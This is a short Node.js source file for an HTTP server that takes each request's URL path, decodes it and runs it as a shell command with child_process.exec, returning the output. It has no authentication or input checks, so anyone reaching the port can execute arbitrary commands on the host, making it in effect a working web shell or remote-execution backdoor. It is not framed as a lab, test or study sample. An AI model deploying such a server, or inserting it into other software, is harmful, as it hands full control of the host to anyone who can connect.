const http = require('http');
var child = require('child_process');

const requestListener = function(req, res) {
  let command = decodeURI(req.url.substr(1));

  res.writeHead(200);
  let result = '';

  result += '>> ' + command + '\n' + '\n';

  if (command != '') {
    child.exec(command, function(err, stdout, stderr) {
      result += stdout + '\n';
      console.log(stdout);
      res.end(result);
    });
  } else {
    res.end(result);
  }
};

const server = http.createServer(requestListener);
server.listen(process.env.PORT || 8080);
